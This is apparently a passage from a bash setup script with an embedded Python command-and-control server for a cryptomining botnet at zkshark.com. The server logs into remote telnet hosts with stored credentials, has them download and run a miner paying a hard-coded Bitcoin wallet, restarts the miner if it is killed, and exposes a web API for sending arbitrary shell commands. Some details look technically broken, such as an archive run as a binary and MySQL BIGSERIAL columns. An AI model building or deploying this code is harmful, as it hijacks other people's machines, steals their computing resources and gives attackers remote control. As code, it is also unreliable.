#!/bin/bash
# setup_complete_mining_c2.sh - Complete Automated Setup for Mining C2 with Blockchain.com Schema
# Host: zkshark.com
# User: root
# Password:
# DB: localhost
# Ports: 443 (web) and 23 (telnet)
# BTC Wallet: bc1qrprmanzgaermswvts62yrztzzqwhcfr8aqp4ly

set -e

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║     Complete Mining C2 Setup with Blockchain.com Schema       ║"
echo "╚════════════════════════════════════════════════════════════════╝"

# Configuration
HOSTNAME="zkshark.com"
WEB_PORT="443"
TELNET_PORT="23"
BTC_WALLET="bc1qrprmanzgaermswvts62yrztzzqwhcfr8aqp4ly"
DB_PASSWORD=""
DB_USER="root"
DB_NAME="mining_c2_blockchain"

echo "[*] Updating system and installing core packages..."
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get upgrade -y
apt-get install -y \
    python3 python3-pip python3-venv python3-dev \
    telnet expect screen tmux \
    redis-server htop nload iptables \
    mariadb-server mariadb-client \
    postgresql postgresql-contrib \
    nginx certbot python3-certbot-nginx \
    ufw fail2ban \
    git curl wget unzip \
    build-essential libssl-dev libffi-dev \
    netcat-openbsd nmap

echo "[*] Setting up database (MariaDB/MySQL)..."
systemctl start mariadb
systemctl enable mariadb

# Secure MariaDB installation
mysql <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED BY '${DB_PASSWORD}';
DELETE FROM mysql.user WHERE User='';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
FLUSH PRIVILEGES;
EOF

# Create database and import blockchain.com schema
echo "[*] Creating database and importing blockchain.com schema..."
mysql -u root -p${DB_PASSWORD} <<EOF
DROP DATABASE IF EXISTS ${DB_NAME};
CREATE DATABASE ${DB_NAME};
USE ${DB_NAME};
SOURCE /tmp/blockchaindotcom.sql;
GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO 'root'@'localhost' IDENTIFIED BY '${DB_PASSWORD}';
GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO 'mining'@'localhost' IDENTIFIED BY '${DB_PASSWORD}';
FLUSH PRIVILEGES;
EOF

# Create additional tables for mining C2
mysql -u root -p${DB_PASSWORD} ${DB_NAME} <<EOF
-- Mining workers table
CREATE TABLE IF NOT EXISTS mining_workers (
    worker_id BIGSERIAL PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    telnet_port INT DEFAULT 23,
    username VARCHAR(255),
    password_hash VARCHAR(255),
    status ENUM('active', 'inactive', 'error', 'mining') DEFAULT 'inactive',
    worker_name VARCHAR(255) UNIQUE,
    architecture VARCHAR(50),
    cpu_cores INT DEFAULT 0,
    memory_mb INT DEFAULT 0,
    hash_rate FLOAT DEFAULT 0,
    total_shares BIGINT DEFAULT 0,
    valid_shares BIGINT DEFAULT 0,
    invalid_shares BIGINT DEFAULT 0,
    last_seen TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_status (status),
    INDEX idx_last_seen (last_seen),
    INDEX idx_ip (ip_address)
);

-- Mining pool configuration
CREATE TABLE IF NOT EXISTS mining_pools (
    pool_id BIGSERIAL PRIMARY KEY,
    pool_name VARCHAR(255) NOT NULL,
    pool_url VARCHAR(255) NOT NULL,
    port INT DEFAULT 3333,
    username VARCHAR(255),
    password VARCHAR(255),
    is_active BOOLEAN DEFAULT TRUE,
    priority INT DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert default pool
INSERT INTO mining_pools (pool_name, pool_url, port, username, password) 
VALUES ('ckpool', 'stratum+tcp://pool.ckpool.org', 3333, '${BTC_WALLET}', 'x');

-- Mining jobs table
CREATE TABLE IF NOT EXISTS mining_jobs (
    job_id BIGSERIAL PRIMARY KEY,
    worker_id BIGINT REFERENCES mining_workers(worker_id),
    pool_id BIGINT REFERENCES mining_pools(pool_id),
    job_identifier VARCHAR(255),
    difficulty INT,
    submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status ENUM('pending', 'accepted', 'rejected', 'expired') DEFAULT 'pending',
    shares_difficulty FLOAT,
    block_height INT,
    block_hash VARCHAR(255),
    reward FLOAT,
    FOREIGN KEY (worker_id) REFERENCES mining_workers(worker_id),
    FOREIGN KEY (pool_id) REFERENCES mining_pools(pool_id)
);

-- Commands table
CREATE TABLE IF NOT EXISTS worker_commands (
    command_id BIGSERIAL PRIMARY KEY,
    worker_id BIGINT REFERENCES mining_workers(worker_id),
    command TEXT NOT NULL,
    status ENUM('pending', 'sent', 'executed', 'failed') DEFAULT 'pending',
    result TEXT,
    executed_at TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (worker_id) REFERENCES mining_workers(worker_id)
);

-- System stats
CREATE TABLE IF NOT EXISTS system_stats (
    stat_id BIGSERIAL PRIMARY KEY,
    total_workers INT DEFAULT 0,
    active_workers INT DEFAULT 0,
    total_hashrate FLOAT DEFAULT 0,
    total_shares BIGINT DEFAULT 0,
    btc_balance FLOAT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert initial stats
INSERT INTO system_stats (total_workers, active_workers, total_hashrate, total_shares, btc_balance) 
VALUES (0, 0, 0, 0, 0);
EOF

echo "[*] Creating directory structure..."
mkdir -p /opt/mining_c2/{config,logs,workers,database,scripts,web,ssl,miners}
cd /opt/mining_c2

echo "[*] Setting up Python virtual environment..."
python3 -m venv venv
source venv/bin/activate

echo "[*] Installing Python packages..."
pip install --upgrade pip
pip install \
    asyncio \
    telnetlib3 \
    aiofiles \
    mysql-connector-python \
    psycopg2-binary \
    redis \
    flask \
    flask-socketio \
    flask-login \
    flask-wtf \
    requests \
    cryptography \
    schedule \
    python-dotenv \
    paramiko \
    scp \
    beautifulsoup4 \
    aiohttp \
    websockets \
    prometheus_client \
    gunicorn \
    eventlet

echo "[*] Creating enhanced mining C2 server script..."
cat > /opt/mining_c2/mining_c2_enhanced.py << 'EOF'
#!/usr/bin/env python3
"""
Enhanced Bitcoin Mining Command & Control Server
With Blockchain.com schema integration
"""

import asyncio
import telnetlib3
import json
import logging
import mysql.connector
import redis
import schedule
import time
import threading
from datetime import datetime, timedelta
from pathlib import Path
import hashlib
import base64
import os
import socket
import struct
import subprocess
import requests
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor

# Load configuration
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/mining_c2/logs/c2_enhanced.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('MiningC2Enhanced')

class EnhancedMiningC2Server:
    def __init__(self):
        self.workers = {}
        self.active_connections = {}
        self.pools = {}
        self.mining_user = os.getenv('BTC_WALLET', 'bc1qrprmanzgaermswvts62yrztzzqwhcfr8aqp4ly')
        self.executor = ThreadPoolExecutor(max_workers=10)
        
        # Initialize databases
        self.init_databases()
        
        # Load configuration
        self.load_pools()
        self.load_workers()
        
        # Start background tasks
        self.start_background_tasks()
        
    def init_databases(self):
        """Initialize MySQL connection"""
        try:
            self.mysql = mysql.connector.connect(
                host=os.getenv('MYSQL_HOST', 'localhost'),
                user=os.getenv('MYSQL_USER', 'root'),
                password=os.getenv('MYSQL_PASSWORD', 'root'),
                database=os.getenv('MYSQL_DB', 'mining_c2_blockchain'),
                autocommit=False
            )
            
            # Redis for caching and real-time updates
            self.redis = redis.Redis(
                host=os.getenv('REDIS_HOST', 'localhost'),
                port=int(os.getenv('REDIS_PORT', 6379)),
                decode_responses=True,
                password=os.getenv('REDIS_PASSWORD', None)
            )
            
            logger.info("Databases initialized successfully")
            
        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
            raise
    
    def load_pools(self):
        """Load mining pools from database"""
        cursor = self.mysql.cursor(dictionary=True)
        try:
            cursor.execute("SELECT * FROM mining_pools WHERE is_active = TRUE ORDER BY priority")
            pools = cursor.fetchall()
            for pool in pools:
                self.pools[pool['pool_id']] = pool
            logger.info(f"Loaded {len(pools)} mining pools")
        except Exception as e:
            logger.error(f"Failed to load pools: {e}")
        finally:
            cursor.close()
    
    def load_workers(self):
        """Load workers from database"""
        cursor = self.mysql.cursor(dictionary=True)
        try:
            cursor.execute("SELECT * FROM mining_workers WHERE status != 'error'")
            workers = cursor.fetchall()
            for worker in workers:
                worker_id = f"{worker['ip_address']}:{worker['telnet_port']}"
                self.workers[worker_id] = {
                    'id': worker['worker_id'],
                    'ip': worker['ip_address'],
                    'port': worker['telnet_port'],
                    'username': worker['username'],
                    'password_hash': worker['password_hash'],
                    'worker_name': worker['worker_name'],
                    'status': worker['status'],
                    'architecture': worker['architecture'],
                    'cpu_cores': worker['cpu_cores'],
                    'memory_mb': worker['memory_mb']
                }
            logger.info(f"Loaded {len(workers)} workers")
        except Exception as e:
            logger.error(f"Failed to load workers: {e}")
        finally:
            cursor.close()
    
    def start_background_tasks(self):
        """Start background monitoring tasks"""
        def run_schedule():
            while True:
                schedule.run_pending()
                time.sleep(1)
        
        # Schedule regular tasks
        schedule.every(5).minutes.do(self.update_all_stats)
        schedule.every(1).hours.do(self.check_worker_health)
        schedule.every(6).hours.do(self.update_miner_binaries)
        
        thread = threading.Thread(target=run_schedule, daemon=True)
        thread.start()
    
    async def connect_worker(self, worker_id, worker_info, retry=True):
        """Connect to a telnet worker with enhanced features"""
        max_retries = 3 if retry else 1
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                logger.info(f"Connecting to worker {worker_id} (attempt {retry_count + 1})")
                
                # Try different terminal types
                for term in ['linux', 'xterm', 'vt100', 'dumb']:
                    try:
                        reader, writer = await asyncio.wait_for(
                            telnetlib3.open_connection(
                                worker_info['ip'], 
                                worker_info['port'],
                                shell=None,
                                term=term
                            ),
                            timeout=10
                        )
                        break
                    except:
                        if term == 'dumb':
                            raise
                        continue
                
                # Login with timeout
                login_success = await asyncio.wait_for(
                    self.telnet_login(reader, writer, worker_info),
                    timeout=15
                )
                
                if login_success:
                    # Detect system info
                    system_info = await self.get_system_info(reader, writer)
                    
                    # Update worker info
                    worker_info.update(system_info)
                    
                    # Install miner if needed
                    if await self.check_and_install_miner(reader, writer, worker_info):
                        # Start mining
                        await self.start_mining(reader, writer, worker_info)
                        
                        # Store connection
                        self.active_connections[worker_id] = {
                            'reader': reader,
                            'writer': writer,
                            'info': worker_info,
                            'connected_at': datetime.now(),
                            'last_command': datetime.now(),
                            'stats': {}
                        }
                        
                        # Update database
                        self.update_worker_status(worker_id, 'mining', system_info)
                        
                        logger.info(f"Worker {worker_id} connected and mining started")
                        
                        # Start monitoring
                        asyncio.create_task(self.monitor_worker(worker_id, reader))
                        
                        return True
                
                retry_count += 1
                if retry_count < max_retries:
                    await asyncio.sleep(5 * retry_count)
                    
            except asyncio.TimeoutError:
                logger.warning(f"Connection timeout for {worker_id}")
                retry_count += 1
            except Exception as e:
                logger.error(f"Failed to connect to worker {worker_id}: {e}")
                retry_count += 1
        
        self.update_worker_status(worker_id, 'error')
        return False
    
    async def telnet_login(self, reader, writer, worker_info):
        """Enhanced telnet login with multiple prompt handling"""
        login_attempts = 0
        max_attempts = 3
        
        # Common prompts
        prompts = {
            'login': ['login:', 'username:', 'user:', 'login as:'],
            'password': ['password:', 'pass:', 'mot de passe:']
        }
        
        while login_attempts < max_attempts:
            try:
                output = await asyncio.wait_for(reader.read(1024), timeout=5)
                output_lower = output.lower()
                
                # Check for login prompt
                for prompt in prompts['login']:
                    if prompt in output_lower:
                        writer.write(worker_info['username'] + '\n')
                        await writer.drain()
                        
                        # Wait for password prompt
                        output = await asyncio.wait_for(reader.read(1024), timeout=5)
                        output_lower = output.lower()
                        
                        for p_prompt in prompts['password']:
                            if p_prompt in output_lower:
                                writer.write(worker_info['password_hash'] + '\n')
                                await writer.drain()
                                
                                # Check login success
                                output = await asyncio.wait_for(reader.read(1024), timeout=5)
                                
                                if not any(word in output.lower() for word in ['incorrect', 'failed', 'invalid']):
                                    logger.info(f"Login successful for {worker_info['ip']}")
                                    return True
                                break
                        break
                
                login_attempts += 1
                await asyncio.sleep(1)
                
            except asyncio.TimeoutError:
                login_attempts += 1
                continue
        
        return False
    
    async def get_system_info(self, reader, writer):
        """Gather detailed system information"""
        info = {
            'architecture': 'unknown',
            'cpu_cores': 0,
            'memory_mb': 0,
            'os_type': 'unknown',
            'has_wget': False,
            'has_curl': False
        }
        
        commands = [
            ('uname -m', 'architecture'),
            ('cat /proc/cpuinfo | grep processor | wc -l', 'cpu_cores'),
            ('free -m | grep Mem | awk \'{print $2}\'', 'memory_mb'),
            ('uname -s', 'os_type'),
            ('which wget', 'has_wget'),
            ('which curl', 'has_curl')
        ]
        
        for cmd, key in commands:
            writer.write(cmd + '\n')
            await writer.drain()
            try:
                output = await asyncio.wait_for(reader.read(1024), timeout=3)
                output = output.strip()
                
                if key in ['has_wget', 'has_curl']:
                    info[key] = 'wget' in output or 'curl' in output
                elif key == 'cpu_cores':
                    try:
                        info[key] = int(output.split('\n')[-1].strip())
                    except:
                        info[key] = 1
                elif key == 'memory_mb':
                    try:
                        info[key] = int(output.split('\n')[-1].strip())
                    except:
                        info[key] = 512
                else:
                    info[key] = output.split('\n')[-1].strip()
            except:
                pass
        
        return info
    
    async def check_and_install_miner(self, reader, writer, worker_info):
        """Check if miner is installed and install if needed"""
        # Check if miner exists
        writer.write('ls -la /tmp/mining/miner 2>/dev/null\n')
        await writer.drain()
        
        try:
            output = await asyncio.wait_for(reader.read(1024), timeout=2)
            if 'No such file' not in output and 'cannot access' not in output:
                # Miner exists, check if it's running
                writer.write('pgrep miner\n')
                await writer.drain()
                
                try:
                    output = await asyncio.wait_for(reader.read(1024), timeout=2)
                    if output.strip().isdigit():
                        logger.info(f"Miner already running on {worker_info['ip']}")
                        return True
                except:
                    pass
        except:
            pass
        
        # Install miner
        return await self.install_miner(reader, writer, worker_info)
    
    async def install_miner(self, reader, writer, worker_info):
        """Install appropriate miner based on architecture"""
        
        # Get architecture
        writer.write('uname -m\n')
        await writer.drain()
        arch = await asyncio.wait_for(reader.read(1024), timeout=3)
        arch = arch.strip()
        worker_info['architecture'] = arch
        
        # Get miner URL
        miner_url = self.get_miner_url(arch)
        
        # Create directory
        writer.write('mkdir -p /tmp/mining\n')
        await writer.drain()
        await asyncio.sleep(0.5)
        
        # Download miner based on available tools
        if worker_info.get('has_wget'):
            cmd = f'wget -q -O /tmp/mining/miner {miner_url}'
        elif worker_info.get('has_curl'):
            cmd = f'curl -s -o /tmp/mining/miner {miner_url}'
        else:
            logger.error(f"No download tool available for {worker_info['ip']}")
            return False
        
        writer.write(cmd + '\n')
        await writer.drain()
        await asyncio.sleep(2)
        
        # Make executable
        writer.write('chmod +x /tmp/mining/miner\n')
        await writer.drain()
        await asyncio.sleep(0.5)
        
        # Verify installation
        writer.write('ls -la /tmp/mining/miner\n')
        await writer.drain()
        
        try:
            output = await asyncio.wait_for(reader.read(1024), timeout=2)
            if '-rwx' in output or 'total' in output:
                logger.info(f"Miner installed successfully on {worker_info['ip']}")
                return True
        except:
            pass
        
        return False
    
    def get_miner_url(self, arch):
        """Return appropriate miner URL for architecture"""
        miners = {
            'armv7l': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux-armv7.tar.gz',
            'armv6l': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux-armv6.tar.gz',
            'aarch64': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux-arm64.tar.gz',
            'x86_64': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz',
            'i686': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux-cpu.tar.gz',
            'mips': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux-mips.tar.gz',
            'mipsel': 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux-mipsel.tar.gz'
        }
        return miners.get(arch, miners['x86_64'])
    
    async def start_mining(self, reader, writer, worker_info):
        """Configure and start mining process"""
        worker_name = worker_info.get('worker_name', f"worker_{worker_info['ip'].replace('.', '_')}")
        
        # Get pool configuration
        pool = list(self.pools.values())[0] if self.pools else {
            'pool_url': 'stratum+tcp://pool.ckpool.org',
            'port': 3333
        }
        
        # Create mining script based on architecture
        if 'arm' in worker_info.get('architecture', '') or 'aarch64' in worker_info.get('architecture', ''):
            mining_script = f"""#!/bin/sh
cd /tmp/mining
while true; do
    ./miner -a sha256d -o {pool['pool_url']}:{pool['port']} -u {self.mining_user}.{worker_name} -p x
    sleep 10
done
"""
        else:
            mining_script = f"""#!/bin/sh
cd /tmp/mining
while true; do
    ./miner --algo sha256d --url {pool['pool_url']}:{pool['port']} --user {self.mining_user}.{worker_name} --pass x
    sleep 10
done
"""
        
        # Write script
        writer.write(f"cat > /tmp/mining/start.sh << 'EOF'\n{mining_script}\nEOF\n")
        await writer.drain()
        await asyncio.sleep(1)
        
        writer.write("chmod +x /tmp/mining/start.sh\n")
        await writer.drain()
        await asyncio.sleep(1)
        
        # Kill existing miner if running
        writer.write("pkill miner 2>/dev/null\n")
        await writer.drain()
        await asyncio.sleep(1)
        
        # Start mining
        writer.write("nohup /tmp/mining/start.sh > /tmp/mining/output.log 2>&1 &\n")
        await writer.drain()
        
        # Verify it started
        writer.write("pgrep miner\n")
        await writer.drain()
        
        try:
            output = await asyncio.wait_for(reader.read(1024), timeout=2)
            if output.strip().isdigit():
                logger.info(f"Mining started on {worker_info['ip']} (PID: {output.strip()})")
                
                # Update database
                self.update_mining_status(worker_info['id'], True)
                return True
        except:
            pass
        
        return False
    
    async def monitor_worker(self, worker_id, reader):
        """Enhanced worker monitoring"""
        while worker_id in self.active_connections:
            try:
                connection = self.active_connections[worker_id]
                
                if reader.at_eof():
                    logger.warning(f"Worker {worker_id} disconnected")
                    break
                
                writer = connection['writer']
                
                # Check miner status
                writer.write('pgrep miner\n')
                await writer.drain()
                
                try:
                    output = await asyncio.wait_for(reader.read(1024), timeout=3)
                    if not output.strip().isdigit():
                        # Miner died, restart it
                        logger.warning(f"Miner died on {worker_id}, restarting...")
                        writer.write('cd /tmp/mining && ./start.sh\n')
                        await writer.drain()
                except:
                    pass
                
                # Get hash rate if possible
                try:
                    writer.write('tail -n 5 /tmp/mining/output.log | grep -i "hashrate\\|speed" | tail -n 1\n')
                    await writer.drain()
                    output = await asyncio.wait_for(reader.read(1024), timeout=3)
                    
                    # Parse hash rate
                    import re
                    match = re.search(r'(\d+(?:\.\d+)?)\s*[KMG]?h/s', output, re.I)
                    if match:
                        hash_rate = float(match.group(1))
                        connection['stats']['hash_rate'] = hash_rate
                        self.update_worker_stats(worker_id, hash_rate)
                except:
                    pass
                
                connection['last_command'] = datetime.now()
                self.update_worker_last_seen(worker_id)
                
                await asyncio.sleep(30)
                
            except Exception as e:
                logger.error(f"Error monitoring worker {worker_id}: {e}")
                await asyncio.sleep(60)
        
        await self.disconnect_worker(worker_id)
    
    def update_worker_status(self, worker_id, status, system_info=None):
        """Update worker status in database"""
        cursor = self.mysql.cursor()
        try:
            ip, port = worker_id.split(':')
            
            if system_info:
                cursor.execute("""
                    UPDATE mining_workers 
                    SET status = %s, 
                        last_seen = NOW(),
                        architecture = %s,
                        cpu_cores = %s,
                        memory_mb = %s
                    WHERE ip_address = %s AND telnet_port = %s
                """, (status, 
                      system_info.get('architecture', 'unknown'),
                      system_info.get('cpu_cores', 0),
                      system_info.get('memory_mb', 0),
                      ip, int(port)))
            else:
                cursor.execute("""
                    UPDATE mining_workers 
                    SET status = %s, last_seen = NOW()
                    WHERE ip_address = %s AND telnet_port = %s
                """, (status, ip, int(port)))
            
            self.mysql.commit()
            
            # Update redis cache
            self.redis.hset(f"worker:{ip}:{port}", "status", status)
            self.redis.hset(f"worker:{ip}:{port}", "last_seen", datetime.now().isoformat())
            
        except Exception as e:
            logger.error(f"Failed to update worker status: {e}")
            self.mysql.rollback()
        finally:
            cursor.close()
    
    def update_worker_last_seen(self, worker_id):
        """Update worker last_seen timestamp"""
        cursor = self.mysql.cursor()
        try:
            ip, port = worker_id.split(':')
            cursor.execute("""
                UPDATE mining_workers 
                SET last_seen = NOW()
                WHERE ip_address = %s AND telnet_port = %s
            """, (ip, int(port)))
            self.mysql.commit()
        except Exception as e:
            logger.error(f"Failed to update last_seen: {e}")
            self.mysql.rollback()
        finally:
            cursor.close()
    
    def update_worker_stats(self, worker_id, hash_rate):
        """Update worker mining stats"""
        cursor = self.mysql.cursor()
        try:
            ip, port = worker_id.split(':')
            cursor.execute("""
                UPDATE mining_workers 
                SET hash_rate = %s,
                    total_shares = total_shares + 1
                WHERE ip_address = %s AND telnet_port = %s
            """, (hash_rate, ip, int(port)))
            self.mysql.commit()
            
            # Update redis
            self.redis.hset(f"worker:{ip}:{port}", "hash_rate", hash_rate)
            self.redis.hincrby(f"worker:{ip}:{port}", "total_shares", 1)
            
        except Exception as e:
            logger.error(f"Failed to update worker stats: {e}")
            self.mysql.rollback()
        finally:
            cursor.close()
    
    def update_mining_status(self, worker_id, is_mining):
        """Update mining status in blockchain.com style tables"""
        cursor = self.mysql.cursor()
        try:
            cursor.execute("""
                UPDATE mining_workers 
                SET status = %s
                WHERE worker_id = %s
            """, ('mining' if is_mining else 'active', worker_id))
            
            # Record job in mining_jobs table
            cursor.execute("""
                INSERT INTO mining_jobs (worker_id, pool_id, status)
                VALUES (%s, 1, 'accepted')
            """, (worker_id,))
            
            self.mysql.commit()
        except Exception as e:
            logger.error(f"Failed to update mining status: {e}")
            self.mysql.rollback()
        finally:
            cursor.close()
    
    async def disconnect_worker(self, worker_id):
        """Disconnect and cleanup worker"""
        if worker_id in self.active_connections:
            try:
                writer = self.active_connections[worker_id]['writer']
                writer.write('exit\n')
                await writer.drain()
                writer.close()
            except:
                pass
            
            del self.active_connections[worker_id]
            self.update_worker_status(worker_id, 'inactive')
            logger.info(f"Worker {worker_id} disconnected")
    
    async def connect_all_workers(self):
        """Connect to all configured workers"""
        tasks = []
        for worker_id, worker_info in self.workers.items():
            if worker_info['status'] in ['inactive', 'error']:
                tasks.append(self.connect_worker(worker_id, worker_info))
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in results if r is True)
            logger.info(f"Connected {success_count} out of {len(tasks)} workers")
            
            # Update system stats
            self.update_system_stats()
    
    def update_system_stats(self):
        """Update system statistics"""
        cursor = self.mysql.cursor(dictionary=True)
        try:
            cursor.execute("""
                SELECT 
                    COUNT(*) as total_workers,
                    SUM(CASE WHEN status = 'mining' THEN 1 ELSE 0 END) as active_workers,
                    SUM(hash_rate) as total_hashrate,
                    SUM(total_shares) as total_shares
                FROM mining_workers
            """)
            stats = cursor.fetchone()
            
            if stats:
                cursor.execute("""
                    INSERT INTO system_stats 
                    (total_workers, active_workers, total_hashrate, total_shares)
                    VALUES (%s, %s, %s, %s)
                """, (
                    stats['total_workers'] or 0,
                    stats['active_workers'] or 0,
                    stats['total_hashrate'] or 0,
                    stats['total_shares'] or 0
                ))
                self.mysql.commit()
                
                # Update redis
                self.redis.hmset("system:stats", {
                    "total_workers": stats['total_workers'] or 0,
                    "active_workers": stats['active_workers'] or 0,
                    "total_hashrate": stats['total_hashrate'] or 0,
                    "total_shares": stats['total_shares'] or 0
                })
                
        except Exception as e:
            logger.error(f"Failed to update system stats: {e}")
            self.mysql.rollback()
        finally:
            cursor.close()
    
    def check_worker_health(self):
        """Periodic worker health check"""
        cursor = self.mysql.cursor(dictionary=True)
        try:
            # Check for stale workers
            cursor.execute("""
                SELECT worker_id, ip_address, telnet_port 
                FROM mining_workers 
                WHERE last_seen < NOW() - INTERVAL 10 MINUTE
                AND status IN ('active', 'mining')
            """)
            stale_workers = cursor.fetchall()
            
            for worker in stale_workers:
                worker_id = f"{worker['ip_address']}:{worker['telnet_port']}"
                if worker_id in self.active_connections:
                    # Try to reconnect
                    asyncio.create_task(
                        self.disconnect_worker(worker_id)
                    )
                else:
                    # Update status
                    cursor.execute("""
                        UPDATE mining_workers 
                        SET status = 'error' 
                        WHERE worker_id = %s
                    """, (worker['worker_id'],))
            
            self.mysql.commit()
            
        except Exception as e:
            logger.error(f"Health check failed: {e}")
            self.mysql.rollback()
        finally:
            cursor.close()
    
    def update_all_stats(self):
        """Update all statistics"""
        self.update_system_stats()
    
    def update_miner_binaries(self):
        """Download latest miner binaries"""
        # This would download and cache miner binaries
        pass
    
    def get_stats(self):
        """Get current statistics"""
        return self.redis.hgetall("system:stats")

class WebInterface:
    """Enhanced Flask web interface"""
    
    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.app = None
        self.setup_app()
    
    def setup_app(self):
        from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file
        from functools import wraps
        import secrets
        
        self.app = Flask(__name__)
        self.app.secret_key = os.getenv('FLASK_SECRET_KEY', secrets.token_hex(32))
        
        def login_required(f):
            @wraps(f)
            def decorated_function(*args, **kwargs):
                if 'logged_in' not in session:
                    return redirect(url_for('login'))
                return f(*args, **kwargs)
            return decorated_function
        
        @self.app.route('/')
        @login_required
        def index():
            return render_template('enhanced_dashboard.html')
        
        @self.app.route('/api/stats')
        @login_required
        def api_stats():
            stats = self.c2_server.get_stats()
            return jsonify(stats)
        
        @self.app.route('/api/workers')
        @login_required
        def api_workers():
            cursor = self.c2_server.mysql.cursor(dictionary=True)
            cursor.execute("""
                SELECT * FROM mining_workers 
                ORDER BY last_seen DESC
            """)
            workers = cursor.fetchall()
            cursor.close()
            return jsonify(workers)
        
        @self.app.route('/api/workers/<int:worker_id>')
        @login_required
        def api_worker_detail(worker_id):
            cursor = self.c2_server.mysql.cursor(dictionary=True)
            cursor.execute("""
                SELECT w.*, 
                       COUNT(j.job_id) as total_jobs,
                       SUM(CASE WHEN j.status = 'accepted' THEN 1 ELSE 0 END) as accepted_jobs
                FROM mining_workers w
                LEFT JOIN mining_jobs j ON w.worker_id = j.worker_id
                WHERE w.worker_id = %s
                GROUP BY w.worker_id
            """, (worker_id,))
            worker = cursor.fetchone()
            cursor.close()
            return jsonify(worker)
        
        @self.app.route('/api/workers/add', methods=['POST'])
        @login_required
        def add_worker():
            data = request.json
            worker_id = f"{data['ip']}:{data.get('port', 23)}"
            
            cursor = self.c2_server.mysql.cursor()
            try:
                cursor.execute("""
                    INSERT INTO mining_workers 
                    (ip_address, telnet_port, username, password_hash, worker_name, status)
                    VALUES (%s, %s, %s, %s, %s, 'inactive')
                """, (
                    data['ip'], 
                    data.get('port', 23),
                    data['username'],
                    data['password'],
                    data.get('worker_name', f"worker_{data['ip'].replace('.', '_')}")
                ))
                self.c2_server.mysql.commit()
                
                worker_id_db = cursor.lastrowid
                
                # Add to workers dict
                self.c2_server.workers[worker_id] = {
                    'id': worker_id_db,
                    'ip': data['ip'],
                    'port': data.get('port', 23),
                    'username': data['username'],
                    'password_hash': data['password'],
                    'worker_name': data.get('worker_name', f"worker_{data['ip'].replace('.', '_')}"),
                    'status': 'inactive'
                }
                
                # Attempt connection
                asyncio.create_task(
                    self.c2_server.connect_worker(worker_id, self.c2_server.workers[worker_id])
                )
                
                return jsonify({'status': 'success', 'message': 'Worker added', 'worker_id': worker_id_db})
                
            except Exception as e:
                self.c2_server.mysql.rollback()
                return jsonify({'status': 'error', 'message': str(e)}), 400
            finally:
                cursor.close()
        
        @self.app.route('/api/workers/<int:worker_id>/command', methods=['POST'])
        @login_required
        def send_worker_command(worker_id):
            command = request.json.get('command')
            
            cursor = self.c2_server.mysql.cursor(dictionary=True)
            try:
                cursor.execute("""
                    SELECT ip_address, telnet_port FROM mining_workers WHERE worker_id = %s
                """, (worker_id,))
                worker = cursor.fetchone()
                
                if worker:
                    worker_key = f"{worker['ip_address']}:{worker['telnet_port']}"
                    
                    if worker_key in self.c2_server.active_connections:
                        # Send command to active connection
                        connection = self.c2_server.active_connections[worker_key]
                        writer = connection['writer']
                        
                        # Execute in thread to not block
                        def send_cmd():
                            try:
                                writer.write(command + '\n')
                                # This is async, but we're in a thread
                            except:
                                pass
                        
                        import threading
                        threading.Thread(target=send_cmd).start()
                        
                        # Save to database
                        cursor.execute("""
                            INSERT INTO worker_commands (worker_id, command, status)
                            VALUES (%s, %s, 'sent')
                        """, (worker_id, command))
                        self.c2_server.mysql.commit()
                        
                        return jsonify({'status': 'success', 'message': 'Command sent'})
                    
                return jsonify({'status': 'error', 'message': 'Worker not connected'}), 400
                
            except Exception as e:
                return jsonify({'status': 'error', 'message': str(e)}), 400
            finally:
                cursor.close()
        
        @self.app.route('/api/workers/<int:worker_id>/restart', methods=['POST'])
        @login_required
        def restart_worker_mining(worker_id):
            cursor = self.c2_server.mysql.cursor(dictionary=True)
            try:
                cursor.execute("""
                    SELECT ip_address, telnet_port FROM mining_workers WHERE worker_id = %s
                """, (worker_id,))
                worker = cursor.fetchone()
                
                if worker:
                    worker_key = f"{worker['ip_address']}:{worker['telnet_port']}"
                    
                    if worker_key in self.c2_server.active_connections:
                        connection = self.c2_server.active_connections[worker_key]
                        writer = connection['writer']
                        
                        # Restart mining
                        writer.write('pkill miner; cd /tmp/mining && ./start.sh\n')
                        
                        return jsonify({'status': 'success', 'message': 'Mining restarted'})
                    
                return jsonify({'status': 'error', 'message': 'Worker not connected'}), 400
                
            finally:
                cursor.close()
        
        @self.app.route('/api/pools')
        @login_required
        def api_pools():
            return jsonify(list(self.c2_server.pools.values()))
        
